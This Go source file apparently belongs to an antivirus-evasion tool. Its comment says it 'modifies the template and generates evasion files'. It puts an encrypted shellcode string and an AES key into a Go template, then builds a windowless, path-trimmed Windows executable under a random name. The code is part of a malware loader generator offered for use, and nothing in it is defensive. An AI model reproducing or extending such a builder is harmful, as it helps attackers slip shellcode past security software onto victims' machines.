package In

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"math/big"
	"os"
	"os/exec"
	"text/template"
	"time"
)

//修改模板并生成免杀文件
func Tpl_go(enshell ,key string, keymode int,s string) string {
	//取模板名字
	sname := tplname(s)
	tpl(enshell,key, sname,keymode)



	randomStr := CreateRandomString(6)
	Filename := randomStr + ".exe"
	time.Sleep(2)

	//a:="go build -ldflags=\"-w -s -H=windowsgui\" -o "+"./bin/"+Filename+" \"+sname+\".go\""
	cmd:=exec.Command("cmd", "/c", "go build -ldflags=-H=windowsgui --trimpath -o "+"./bin/"+Filename+" "+sname+".go")
	err := cmd.Run()
	if err != nil {
		panic(err)
	}
	return Filename

}

func tpl(tshell, key,tplname string,Kmode int) {
	smode :=fmt.Sprintf("%d", Kmode)
	skey :=hex.EncodeToString([]byte(key))
	type Inventory struct {
		Exshell string
		AesKey	string
		Keymode string
	}
	Texts := Inventory{tshell,skey,smode}
	gname := movfile(tplname)
	tmpl, err := template.ParseFiles(tplname)
	file, err := os.OpenFile(gname, os.O_CREATE|os.O_WRONLY, 0755)
	CheckErr(err)
	err = tmpl.Execute(file, Texts)
	CheckErr(err)
}

func CheckErr(err error) {
	if err != nil {
		panic(err)
	}
}

//随机字符串
func CreateRandomString(len int) string {
	var container string
	var str = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	b := bytes.NewBufferString(str)
	length := b.Len()
	bigInt := big.NewInt(int64(length))
	for i := 0; i < len; i++ {
		randomInt, _ := rand.Int(rand.Reader, bigInt)
		container += string(str[randomInt.Int64()])
	}
	return container
}

//判断选择模板类型  后期需要在添加
func tplname(src string) string {
	var name string
	name = "./In/template/"+src

	return name

}

func movfile(sourceFile string) string {
	goname := sourceFile + ".go"
	input, err := ioutil.ReadFile(sourceFile)
	if err != nil {
		fmt.Println(err)
	}
	err = ioutil.WriteFile(goname, input, 0644)
	if err != nil {
		fmt.Println("Error creating", goname)
		fmt.Println(err)
	}

	return goname

}
